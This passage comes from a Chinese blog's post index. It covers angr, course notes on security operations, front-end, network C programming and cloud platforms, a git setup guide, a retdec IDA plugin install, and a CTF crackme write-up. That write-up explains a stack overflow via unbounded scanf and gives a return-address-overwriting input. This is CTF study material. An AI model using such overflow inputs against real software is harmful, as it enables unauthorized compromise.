0x40167d, 0x40167e, 0x40167f, 0x401686, 0x40168d, 0x401694]</code></pre><h3 id="states"><a href="#states" class="headerlink" title="states"></a>states</h3><p>另一个关于angr的事实是，Project对象仅仅代表程序的一个已初始化映像。当你要使用angr来进行执行时，你需要使用到一个表示模拟程序状态的特殊对象，SimState对象，我们现在就来获取一个</p><pre><code>&gt;&gt;&gt; state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Angr</tag>
+      
+      <tag>程序自动化</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>课程笔记：安全运维平台设计</title>
+    <link href="undefined2019/04/28/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%E5%B9%B3%E5%8F%B0%E8%AE%BE%E8%AE%A1/"/>
+    <url>2019/04/28/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%E5%B9%B3%E5%8F%B0%E8%AE%BE%E8%AE%A1/</url>
+    
+    <content type="html"><![CDATA[<blockquote><p>基于大数据技术，集中采集、存储和分析全面的网络安全要素，利用风险计算模型、人机交互分析、智能分析引擎、可视化、工作流引擎、设备协同等手段，结合领先的威胁情报，对关键信息基础设施的运行状态、面临的外部攻击、内部违规行为进行深度检测，建立快速有效的威胁检测、分析、处置能力和全网安全风险感知与协同响应能力，以达到“摸清家底，认清风险，找出漏洞，通报结果，督促整改”的效果，真正实现聚焦业务稳定运行的安全运维。</p></blockquote><p>安全运维参评的了解<br>我的宏观概念：<br><img src="1.png" srcset="/img/loading.gif" alt></p><p>安全运维产品都是为我们为网络管理员和企业资源服务，包括但不限于：防火墙（NISG），入侵防御（IDS），上网行为管理系统（NIBC），漏洞扫描（NASM），防病毒，数据风控… 由他们相互合作，达到就好的服务效果。</p><p>安全运维产品为安全和简洁为生，使网络结构化，高度安全化，以及便于管理员管理。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>课堂笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>安全运维</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>课程笔记：前端页面开发</title>
+    <link href="undefined2019/04/26/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%89%8D%E7%AB%AF%E9%A1%B5%E9%9D%A2%E5%BC%80%E5%8F%91/"/>
+    <url>2019/04/26/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%89%8D%E7%AB%AF%E9%A1%B5%E9%9D%A2%E5%BC%80%E5%8F%91/</url>
+    
+    <content type="html"><![CDATA[<p>不是写HTML基础，只记录一些框架和技术,我本人不是很喜欢前端，觉得枯燥。。。</p><h2 id="什么是JavaScript"><a href="#什么是JavaScript" class="headerlink" title="什么是JavaScript"></a>什么是JavaScript</h2><blockquote><p>JavaScript是一种属于网络的脚本语言,已经被广泛用于Web应用开发,常用来为网页添加各式各样的动态功能,为用户提供更流畅美观的浏览效果。通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的。</p><p>1.是一种解释性脚本语言（代码不进行预编译）。</p><p>2.主要用来向HTML（标准通用标记语言下的一个应用）页面添加交互行为。</p><p>3.可以直接嵌入HTML页面，但写成单独的js文件有利于结构和行为的分离。</p><p>4.跨平台特性，在绝大多数浏览器的支持下，可以在多种平台下运行（如Windows、Linux、Mac、Android、iOS等）。</p><p>Javascript脚本语言同其他语言一样，有它自身的基本数据类型，表达式和算术运算符及程序的基本程序框架。Javascript提供了四种基本的数据类型和两种特殊数据类型用来处理数据和文字。而变量提供存放信息的地方，表达式则可以完成较复杂的信息处理。 </p></blockquote><h2 id="什么是ajax"><a href="#什么是ajax" class="headerlink" title="什么是ajax"></a>什么是ajax</h2><blockquote><p>Ajax 即“Asynchronous Javascript And XML”（异步 JavaScript 和 XML），是指一种创建交互式网页应用的网页开发技术。</p></blockquote><p>这个技术的特点就是可以在不刷新网页的情况下更新网页信息，达到满意的用户体验</p><h2 id="Smart-Client"><a href="#Smart-Client" class="headerlink" title="Smart Client"></a>Smart Client</h2><p><a href="https://www.smartclient.com/smartclient/showcase/?id=Welcome" target="_blank" rel="noopener">在线体验</a></p><p>这是一个Smart Client的官方演示页面，这个框架是感觉很美观，主要是开源，东软的产品，交互式的页面都是这个搭建的。有时间还是可以好好学习一下的。</p><p><a href="前端开发.ppt">安装和使用ppt</a></p><h2 id="ECharts"><a href="#ECharts" class="headerlink" title="ECharts"></a>ECharts</h2><p>一个BSD开源协议的开源项目</p><p><a href="https://echarts.baidu.com/" target="_blank" rel="noopener">官方网站</a></p><p>东软的交互页面的cpu内存使用量的统计表之类的都是使用这个项目来开发的。</p><p>最后附上一点开发前端的代码：</p><p><em>使用的时候要把smartclientSDk文件夹下的isomorphic文件复制到你写的代码下，并且命名为sc就可以了</em></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>课堂笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>前端</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>课程笔记：计算机网络C程序设计</title>
+    <link href="undefined2019/04/26/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9CC%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
+    <url>2019/04/26/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9CC%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我对这个就真的是很感兴趣的，但是苦于不想干开发，只喜欢自己写写代码玩，不能当做工作来干。。。</p><p>这堂课是东软的开发工程师于玉龙老师上的，于老师代码写得是真的不错，简单易懂，比网上代码有好多了，说的写的都是重点，这篇文章我也主要介绍下我的一些学习中的理解，主要的代码实现还是看看源码。</p><p>自己的C语言当初老师教的浅显，后来就基本使用python代替日常开发了，所以也算是个复习和巩固的过程吧。。</p><h2 id="linux与-C"><a href="#linux与-C" class="headerlink" title="linux与 C"></a>linux与 C</h2><p>下面这些技术都是在linux上实现的，计算机网络C程序开发嘛，也是各种网络设备4层和7层设备的底层实现，因为C接近底层，而linux内核右是一个极具开发前途的系统，可以在在上面加上可行的任何功能。。。</p><p>我也是在学习中，下面都是我的学习笔记。如果后期有必要，再写一些吧。</p><h2 id="代码都在github"><a href="#代码都在github" class="headerlink" title="代码都在github"></a>代码都在github</h2><p><a href="https://github.com/L0yy/Course_Notes/tree/master/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9CC%E7%A8%8B%E5%BA%8F" target="_blank" rel="noopener">源码地址</a></p><p>目录介绍</p><h3 id="CH02"><a href="#CH02" class="headerlink" title="CH02"></a>CH02</h3><h4 id="01hello"><a href="#01hello" class="headerlink" title="01hello"></a>01hello</h4><p>依旧是最喜欢的hello world</p><h4 id="02option"><a href="#02option" class="headerlink" title="02option"></a>02option</h4><p>这个很有用，获取命令行参数，并且可以自己定义方法，使用了<code>getopt.h</code>这个头文件，命令行工具必备。</p><h4 id="03cli"><a href="#03cli" class="headerlink" title="03cli"></a>03cli</h4><p>自定义一个获取参数行的参数，这个不如第二个好用，个人建议使用第二个，但是这个更简单， 如果只是个简单的去参还是可以使用的。</p><h3 id="CH03"><a href="#CH03" class="headerlink" title="CH03"></a>CH03</h3><h4 id="01current-c"><a href="#01current-c" class="headerlink" title="01current.c"></a>01current.c</h4><p><code>time.h</code>时间库函数的使用</p><h4 id="02measure-c"><a href="#02measure-c" class="headerlink" title="02measure.c"></a>02measure.c</h4><p>C语言的时钟，timeval和timespec 两种</p><h4 id="03lstat-c"><a href="#03lstat-c" class="headerlink" title="03lstat.c"></a>03lstat.c</h4><p>获取文件的类型，比如是文件夹或者是可执行文件之类的</p><h4 id="04readdir-c"><a href="#04readdir-c" class="headerlink" title="04readdir.c"></a>04readdir.c</h4><p>使用<code>readdir</code>函数的使用，列出本目录下的文件，可用于文件操作</p><h4 id="05opencnt-c"><a href="#05opencnt-c" class="headerlink" title="05opencnt.c"></a>05opencnt.c</h4><p>打开一个文件，写入一个值，这是典型的使用文件来保存程序运行状态。C语言文件读写。</p><h4 id="06remotehello-c"><a href="#06remotehello-c" class="headerlink" title="06remotehello.c"></a>06remotehello.c</h4><p>这个就厉害了，我刚看到的时候真的惊艳到我了，这么几行代码可以这么厉害。作用是传入一个参数，创建一个为这个参数名的文件，并将输出流导入到里面。<a href="https://blog.csdn.net/z_ryan/article/details/80851739" target="_blank" rel="noopener">dup和dup2的使用介绍</a>.</p><h4 id="07listfile-c"><a href="#07listfile-c" class="headerlink" title="07listfile.c"></a>07listfile.c</h4><p>使用popen执行命令，以及打印的一些技巧</p><h4 id="08daemon-c"><a href="#08daemon-c" class="headerlink" title="08daemon.c"></a>08daemon.c</h4><p>fork() <a href="https://www.cnblogs.com/jycboy/p/l_fork.html" target="_blank" rel="noopener">fork通俗易懂的解释</a>，创建一个几乎和父进程相同的进程，根据返回值不同区分父子进程，父进程退出后，子进程可以使用setsid使用自己父进程的PID，如果不调用，就成为孤儿进程，被操作系统收养，直到执行完成，再由操作系统完成资源回收。</p><h4 id="09thread-c"><a href="#09thread-c" class="headerlink" title="09thread.c"></a>09thread.c</h4><h4 id="10signal-c"><a href="#10signal-c" class="headerlink" title="10signal.c"></a>10signal.c</h4><p><a href="https://blog.csdn.net/edonlii/article/details/8472382" target="_blank" rel="noopener">信号量的使用</a>后面学习学习</p><h4 id="11shmem-c"><a href="#11shmem-c" class="headerlink" title="11shmem.c"></a>11shmem.c</h4><h4 id="12pipe-c"><a href="#12pipe-c" class="headerlink" title="12pipe.c"></a>12pipe.c</h4><h4 id="13semop-c"><a href="#13semop-c" class="headerlink" title="13semop.c"></a>13semop.c</h4><h4 id="14vsysd"><a href="#14vsysd" class="headerlink" title="14vsysd"></a>14vsysd</h4><h4 id="15sqlite-test-c"><a href="#15sqlite-test-c" class="headerlink" title="15sqlite_test.c"></a>15sqlite_test.c</h4><h3 id="CH4"><a href="#CH4" class="headerlink" title="CH4"></a>CH4</h3><h4 id="01tcpclient-c"><a href="#01tcpclient-c" class="headerlink" title="01tcpclient.c"></a>01tcpclient.c</h4><p>socket TCP版本客户端</p><h4 id="01tcpserver-c"><a href="#01tcpserver-c" class="headerlink" title="01tcpserver.c"></a>01tcpserver.c</h4><p>docket TCP版本服务器端</p><h4 id="02udpclient-c"><a href="#02udpclient-c" class="headerlink" title="02udpclient.c"></a>02udpclient.c</h4><h4 id="02udpserver-c"><a href="#02udpserver-c" class="headerlink" title="02udpserver.c"></a>02udpserver.c</h4><h4 id="03ethersock-c"><a href="#03ethersock-c" class="headerlink" title="03ethersock.c"></a>03ethersock.c</h4><h4 id="04pcap-sniffer-c"><a href="#04pcap-sniffer-c" class="headerlink" title="04pcap_sniffer.c"></a>04pcap_sniffer.c</h4><p>数据包处理</p><h4 id="05pcap-filter-c"><a href="#05pcap-filter-c" class="headerlink" title="05pcap_filter.c"></a>05pcap_filter.c</h4><h4 id="06ssl"><a href="#06ssl" class="headerlink" title="06ssl"></a>06ssl</h4>]]></content>
+    
+    
+    <categories>
+      
+      <category>课堂笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>linux</tag>
+      
+      <tag>GCC</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>课程笔记：云平台概述 云安全</title>
+    <link href="undefined2019/04/26/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BA%91%E5%B9%B3%E5%8F%B0%E6%A6%82%E8%BF%B0-%E4%BA%91%E5%AE%89%E5%85%A8/"/>
+    <url>2019/04/26/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BA%91%E5%B9%B3%E5%8F%B0%E6%A6%82%E8%BF%B0-%E4%BA%91%E5%AE%89%E5%85%A8/</url>
+    
+    <content type="html"><![CDATA[<p>记录上课的一些东西，这些都很浅显，完全是为了记一笔这个技术</p><h2 id="云平台"><a href="#云平台" class="headerlink" title="云平台"></a>云平台</h2><blockquote><p>云技术是指在广域网或局域网内将硬件、软件、网络等系列资源统一起来，实现数据的计算、储存、处理和共享的一种托管技术。</p></blockquote><p>可以看看<a href="https://zh.wikipedia.org/wiki/%E9%9B%B2%E7%AB%AF%E9%81%8B%E7%AE%97" target="_blank" rel="noopener">维基百科</a>的解释</p><p>下面是云技术的三种常见技术</p><h3 id="VMware-ESX"><a href="#VMware-ESX" class="headerlink" title="VMware ESX"></a>VMware ESX</h3><p><img src="1.png" srcset="/img/loading.gif" alt></p><blockquote><p>ESXi专为运行虚拟机、最大限度降低配置要求和简化部署而设计。只需几分钟时间，客户便可完成从安装到运行虚拟机的全过程，特别是在下载并安装预配置虚拟设备的时候。</p></blockquote><h4 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h4><p><img src="2.png" srcset="/img/loading.gif" alt></p><p>主要两个部件<br>在裸机服务器装的ESXi 服务  和 在管理员电脑上用来访问 ESXi 服务并安装和管理上面的虚拟机的软件</p><p>服务器上安装ESXI是为了提供虚拟化服务</p><p>如果在小型拓扑环境下管理员可以使用<code>vSphere client</code> ,小巧，方柏霓管理ESXI服务器，但是如果在大型拓扑环境下，就要使用<code>vCenter server</code>，</p><blockquote><p>vCenter server和 vSphere client 很像，但是它和功能更加强大。vCenter server 是安装在 Window 服务器或 Linux 服务器里面。VMware vCenter server 是一个中心化的管理应用。你可以通过它管理所有的虚拟机和 ESXi 物理机。vSphere client 可以通过访问 vCenter Server 来管理 EXSi 服务器。vCenter server 是一个企业级的产品，有许多企业级的功能，像 vMotion, VMware High Availability, VMware Update Manager 和 VMware Distributed Resource Scheduler(DRS)。你可以方便的通过 vCenter server 克隆存在的虚拟机。所以，vCenter 也是 vSphere 套件的一个重要组成部分。你需要单独购买 vCenter 的 license。</p></blockquote><p>安装详情可以参考ppt<a href="cloud.pptx">111</a></p><h3 id="OpenStack"><a href="#OpenStack" class="headerlink" title="OpenStack"></a>OpenStack</h3><p><a href="https://docs.openstack.org/stein/" target="_blank" rel="noopener">官网</a></p><blockquote><p>OpenStack是一个开源的云计算管理平台项目，由几个主要的组件组合起来完成具体工作。OpenStack支持几乎所有类型的云环境，项目目标是提供实施简单、可大规模扩展、丰富、标准统一的云计算管理平台。OpenStack通过各种互补的服务提供了基础设施即服务（IaaS）的解决方案，每个服务提供API以进行集成。</p></blockquote><p>据我们老师说，这个平台很难搭建，一个月起步，实力劝退。</p><p><img src="4.png" srcset="/img/loading.gif" alt="111"><br>OpenStack 是由各个部件组装起来的，每个部件都是不同团队和个人在贡献技术，构建了这么一个大环境，真的很厉害。</p><h3 id="公有云"><a href="#公有云" class="headerlink" title="公有云"></a>公有云</h3><p>这种是最简单的，基本上都是租赁别人的基础设备，可以自己搭建环境，也可以购买成套的服务，比如国内的腾讯云，阿里云，华为云，都是提供这些服务的厂商。</p><p><a href="https://blog.csdn.net/qq_34386891/article/details/79621599" target="_blank" rel="noopener">理解云计算三种服务模式——IaaS、PaaS和SaaS</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>课堂笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>云</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>git迁移后第一次恢复</title>
+    <link href="undefined2019/04/23/git%E8%BF%81%E7%A7%BB%E5%90%8E%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%81%A2%E5%A4%8D/"/>
+    <url>2019/04/23/git%E8%BF%81%E7%A7%BB%E5%90%8E%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%81%A2%E5%A4%8D/</url>
+    
+    <content type="html"><![CDATA[<h2 id="下载安装git"><a href="#下载安装git" class="headerlink" title="下载安装git"></a>下载安装git</h2><p><img src="1.gif" srcset="/img/loading.gif" alt="下载"><br>下载好后直接安装就是了，都是傻瓜操作，都点下一步就是了，git软件不大，安C盘不影响什么的<br>安好后鼠标右键可以出现git Gui选项就好了<br><img src="2.gif" srcset="/img/loading.gif" alt="下载"></p><h2 id="生成自己的ssh密钥对"><a href="#生成自己的ssh密钥对" class="headerlink" title="生成自己的ssh密钥对"></a>生成自己的ssh密钥对</h2><p>在你本地和需要git的服务器进行数据交互需要身份认证，总不至于每次都输账号名和密码吧。。。</p><p>这里我们使用非对称加密密钥对来识别身份。</p><h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><blockquote><p>非对称加密算法需要两个密钥：公开密钥（publickey:简称公钥）和私有密钥（privatekey:简称私钥）。公钥与私钥是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密。</p></blockquote><p>去自己的用户目录下 ~/ 看看有没有/.ssh文件（是隐藏文件，需要打开查看里面的隐藏文件）<br>没有就自己生成一个<br>使用 </p><p><code>ssh-keygen -t rsa -C &quot;youemail@163.com&quot;</code></p><p>然后连续回车就好了</p><h3 id="安装到你github上"><a href="#安装到你github上" class="headerlink" title="安装到你github上"></a>安装到你github上</h3><p>登陆上你的github 打开个人设置里面的 SSH and GPG keys 新建一个，名字随意，key 就填刚才生成的.pub结尾的文件用记事本打开里面的全部内容</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><img src="4.png" srcset="/img/loading.gif" alt="概念"></p><h2 id="配置一个git目录"><a href="#配置一个git目录" class="headerlink" title="配置一个git目录"></a>配置一个git目录</h2><p>好了之后在我们要上传的文件夹内打开git bash</p><p>1 . 初始初始化这个目录为git目录</p><p><code>git init</code></p><p>2 . 配置个人信息</p><p><code>git config --global user.name &quot;My Name&quot;</code><br><code>git config --global user.email myEmail@example.com</code></p><p>3 . 向‘暂存区’提交文件</p><p><code>git add -A</code> -A表示提交这个文件夹下的所有文件，一般都这样用</p><p>4 . 将暂存区里的改动给提交到本地的版本库</p><p><code>git commit -m &quot;Initial commit.&quot;</code> 在每次add 之后都必须提交给本地版本库，不然上传不了</p><p>5 . 自己在github上新建一个项目，最好不要生成README 然后添加远端库</p><p><code>git remote add origin https://github.com/XXXXXXXXXXX/XXXXXXXXX.git</code>  </p><p><img src="3.png" srcset="/img/loading.gif" alt="remote"></p><p>6 . 上传代码</p><p><code>git push -u origin master</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以后上传文件后就<br>1.git add -A<br>2.git commit “Hello World!!!”<br>3.git push</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Git</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>git密钥生成以及安装</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>IDA插件retdec安装详解</title>
+    <link href="undefined2019/04/20/IDA%E6%8F%92%E4%BB%B6retdec%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/"/>
+    <url>2019/04/20/IDA%E6%8F%92%E4%BB%B6retdec%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/</url>
+    
+    <content type="html"><![CDATA[<h2 id="先看看效果"><a href="#先看看效果" class="headerlink" title="先看看效果"></a>先看看效果</h2><p>这是解码base64的汇编分别通过idaF5和retdec反编译的伪代码</p><p><a href="./idaF5.txt">IDAF5效果</a></p><p><a href="./retdec-dec.txt">retdec效果</a></p><h2 id="官方指导"><a href="#官方指导" class="headerlink" title="官方指导"></a>官方指导</h2><blockquote><p>The decompiler is not limited to any particular target architecture, operating system, or executable file format:</p><p>Supported file formats: ELF, PE, Mach-O, COFF, AR (archive), Intel HEX, and raw machine code<br>Supported architectures:</p><p>32-bit: Intel x86, ARM, MIPS, PIC32, and PowerPC</p><p>64-bit: x86-64</p></blockquote><p>就是说支持的反编译的种类</p><p>这里贴一下它的官方地址</p><p><a href="https://retdec.com/" target="_blank" rel="noopener">retdec官网</a></p><p><a href="https://github.com/avast/retdec" target="_blank" rel="noopener">github项目</a></p><h3 id="本地安装"><a href="#本地安装" class="headerlink" title="本地安装"></a>本地安装</h3><p>目的：我们先本地安装好他的环境，再通过IDA插件调用它<br><img src="1.png" srcset="/img/loading.gif" alt="windows安装"></p><p>根据指导我们开始吧</p><h4 id="1-下载并解压缩预先构建的软件包"><a href="#1-下载并解压缩预先构建的软件包" class="headerlink" title="1.下载并解压缩预先构建的软件包"></a>1.下载并解压缩预先构建的软件包</h4><p>进入<a href="https://github.com/avast/retdec/releases这里面是这个项目的成品包，但是只有windows的" target="_blank" rel="noopener">https://github.com/avast/retdec/releases这里面是这个项目的成品包，但是只有windows的</a><br>根据自己系统下载<br><img src="2.png" srcset="/img/loading.gif" alt="windows安装"><br>我选择64位的。</p><h4 id="2-安装-Microsoft-Visual-C-Redistributable-for-Visual-Studio-2015"><a href="#2-安装-Microsoft-Visual-C-Redistributable-for-Visual-Studio-2015" class="headerlink" title="2.安装 Microsoft Visual C++ Redistributable for Visual Studio 2015"></a>2.安装 Microsoft Visual C++ Redistributable for Visual Studio 2015</h4><p>下载链接：<br><a href="https://www.microsoft.com/en-us/download/details.aspx?id=48145" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=48145</a><br>打开选择下载即可</p><h4 id="3-安装python环境"><a href="#3-安装python环境" class="headerlink" title="3.安装python环境"></a>3.安装python环境</h4><p>python必须要&gt;=3.4版本才行，而且要加入到环境变量里去</p><p><img src="3.png" srcset="/img/loading.gif" alt="windows安装"></p><h4 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h4><p>完成以上步骤后，随意我们测试一下<br>自己找个无壳程序我这用一个crackMe.exe</p><p>执行</p><p><code>python $RETDEC_INSTALL_DIR/bin/retdec-decompiler.py test.exe</code></p><p>比如，我将第一步下载的文件解压到d:/</p><p>我的crackMe.exe放在d:/ctf下面</p><p>我就执行</p><p><code>python d:/retdec/bin/retdec-decompiler.py d:/ctf/crackMe.exe</code></p><p>然后等待结果就是了，<em>注意最好不要使用中文目录，会出现问题</em></p><p><img src="4.png" srcset="/img/loading.gif" alt><br>Done后会在exe所在目录创建一下文档.c文档就是我们需要的伪代码了。</p><h3 id="IDA插件retdec"><a href="#IDA插件retdec" class="headerlink" title="IDA插件retdec"></a>IDA插件retdec</h3><p>放一个项目地址<a href="https://github.com/avast/retdec-idaplugin" target="_blank" rel="noopener">github地址</a></p><blockquote><p>RetDec plugin for IDA (Interactive Disassembler).</p><p>The plugin is compatible with the IDA 7.x versions. The plugin does NOT work with IDA 6.x, or freeware version of IDA 7.0. The plugin comes at both 32-bit and 64-bit address space variants (both are 64-bit binaries). I.e. it works in both ida and ida64. At the moment, it can decompile the following architectures:</p><p>32-bit: Intel x86, ARM, MIPS, PIC32, and PowerPC.<br>64-bit: x86-64.</p></blockquote><p>简单说就是插件用在IDA 7.x版本上，IDA 6不能用了。以及在32位和64位能编译的指令集</p><h4 id="下载和安装插件"><a href="#下载和安装插件" class="headerlink" title="下载和安装插件"></a>下载和安装插件</h4><p>地址<br><a href="https://github.com/avast/retdec-idaplugin/releases/tag/v0.9" target="_blank" rel="noopener">https://github.com/avast/retdec-idaplugin/releases/tag/v0.9</a></p><p>下载好后，一共两个dll一个pdf，把两个dll复制到你的IDA7所在目录的plugins下去，就完事了。</p><h4 id="ida-plugs说明书"><a href="#ida-plugs说明书" class="headerlink" title="ida_plugs说明书"></a>ida_plugs说明书</h4><p>就是上面的pdf文件，打开就是插件是详细使用说明。</p><p>我这简单说几点必要的</p><h5 id="为设置retdec-decompiler-py地址"><a href="#为设置retdec-decompiler-py地址" class="headerlink" title="为设置retdec_decompiler.py地址"></a>为设置retdec_decompiler.py地址</h5><p><img src="5.png" srcset="/img/loading.gif" alt><br><img src="6.png" srcset="/img/loading.gif" alt></p><h5 id="插件快捷键"><a href="#插件快捷键" class="headerlink" title="插件快捷键"></a>插件快捷键</h5><p><img src="7.png" srcset="/img/loading.gif" alt><br>自己看retdec的快捷键 一般是<code>Ctrl+D</code></p><p><em>注意，一定要你需要反编译的函数</em></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>IDA</tag>
+      
+      <tag>retdec</tag>
+      
+      <tag>反编译</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>溢出到花指令去除，外加z3解决</title>
+    <link href="undefined2019/04/10/%E6%BA%A2%E5%87%BA%E5%88%B0%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%8E%BB%E9%99%A4%EF%BC%8C%E5%A4%96%E5%8A%A0z3%E8%A7%A3%E5%86%B3/"/>
+    <url>2019/04/10/%E6%BA%A2%E5%87%BA%E5%88%B0%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%8E%BB%E9%99%A4%EF%BC%8C%E5%A4%96%E5%8A%A0z3%E8%A7%A3%E5%86%B3/</url>
+    
+    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>看雪.TSRC 2017CTF秋季赛</p><p>地址：<a href="https://ctf.pediy.com/game-fight-47.htm" target="_blank" rel="noopener">https://ctf.pediy.com/game-fight-47.htm</a></p><h2 id="入坑"><a href="#入坑" class="headerlink" title="入坑"></a>入坑</h2><h3 id="初始程序"><a href="#初始程序" class="headerlink" title="初始程序"></a>初始程序</h3><p>打开国际惯例，查看字符串，找到引用，</p><pre><code>#main函数.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main           proc near               ; CODE XREF: start+AF↓p.text:00401000.text:00401000 argc            = dword ptr  4.text:00401000 argv            = dword ptr  8.text:00401000 envp            = dword ptr  0Ch.text:00401000.text:00401000                 push    offset aCrackmeForCtf2 ; &quot;\n Crackme for CTF2017 @Pediy.\n&quot;.text:00401005                 call    printf.text:0040100A                 add     esp, 4.text:0040100D                 mov     dword ptr unk_41B034, 2.text:00401017                 call    sub_401050.text:0040101C                 call    sub_401090.text:00401021                 call    sub_4010E0.text:00401026                 mov     eax, dword ptr unk_41B034.text:0040102B                 test    eax, eax.text:0040102D                 jnz     short loc_40103F.text:0040102F                 push    offset aYouGetIt ; &quot;You get it!\n&quot;.text:00401034                 call    printf.text:00401039                 add     esp, 4.text:0040103C                 xor     eax, eax.text:0040103E                 retn  </code></pre><p>main函数，很简单，不过不能F5，看来是作者自己汇编，（因为三连call），很简单的流程在<code>text:00401017</code>里面进行输入</p><pre><code>#sub_401050函数.text:00401050 var_C           = dword ptr -0Ch #注意这个地方.text:00401050.text:00401050                 sub     esp, 0Ch.text:00401053                 push    offset aCodedByFpc ; &quot; Coded by Fpc.\n\n&quot;.text:00401058                 call    printf.text:0040105D                 add     esp, 4.text:00401060                 push    offset aPleaseInputYou ; &quot; Please input your code: &quot;.text:00401065                 call    printf.text:0040106A                 add     esp, 4.text:0040106D                 lea     eax, [esp+0Ch+var_C].text:00401071                 push    eax.text:00401072                 push    offset aS       ; &quot;%s&quot; #这里没有确定输入大小，可以导致溢出.text:00401077                 call    _scanf.text:0040107C                 lea     eax, [esp+14h+var_C].text:00401080                 add     esp, 14h.text:00401083                 retn.text:00401083 sub_401050      endp</code></pre><p>经过测试，输入9位没有问题，输入12位会跳转到401000地址处，但是不能输入10位或11位，会导致地址错误，堆栈不平衡。可以自己试验下。</p><h4 id="直接跳转到You-get-it"><a href="#直接跳转到You-get-it" class="headerlink" title="直接跳转到You get it"></a>直接跳转到You get it</h4><p>因为有溢出，我们直接覆盖ret地址,也就是这种aaaabbbbcccc+目标地址十六进制<br>input：<code>aaaabbbbcccc/@</code><br><img src="2.png" srcset="/img/loading.gif" alt="溢出返回地址"><br>但是不符合解题要求,这个值输入不了，只能复制粘贴上</p><h4 id="看看下面两个call"><a href="#看看下面两个call" class="headerlink" title="看看下面两个call"></a>看看下面两个call</h4><pre><code>#sub_401090()if ( v1 &amp;&amp; v0 &amp;&amp; v1 != v0 &amp;&amp; 5 * (v1 - v0) + v1 == 2404399682 &amp;&amp; 13 * (v1 - v0) + v0 == 4015012418 )    --unk_41B034;</code></pre><pre><code>#sub_4010E0()if ( v1 &amp;&amp; v0 &amp;&amp; v1 != v0 &amp;&amp; 17 * (v1 - v0) + v1 == -207009661 &amp;&amp; 7 * (v1 - v0) + v0 == 866732163 )    --unk_41B034;</code></pre><p>可能ida翻译有问题，根据汇编把他两化简出来</p><pre><code>401090:ecx=5678 xedx=1234 yeax=eax-edx = x-yl.3 = eax = x-yeax = eax*5 = (x-y)*5ecx = eax+ecx = (x-y)*5+x(x-y)*5+x = 0x8f503a424010e0:ecx=5678 xedx=1234 yeax=ecx=xeax=eax-edx=x-yl.3=eax=x-yeax=eax*0x11=(x-y)*0x11ecx=ecx+eax=(x-y)*0x11+x(x-y)*0x11+x = 0xf3a94883</code></pre><p>z3 check一下，发现无解 <img src="3.png" srcset="/img/loading.gif" alt="无解"><br>而且看了一下，只能通过这两个地址减少<code>unk_41B034</code>的值所以这个地址是不行的</p><h2 id="别人的write-up"><a href="#别人的write-up" class="headerlink" title="别人的write up"></a>别人的write up</h2><p><a href="https://bbs.pediy.com/thread-222372.htm" target="_blank" 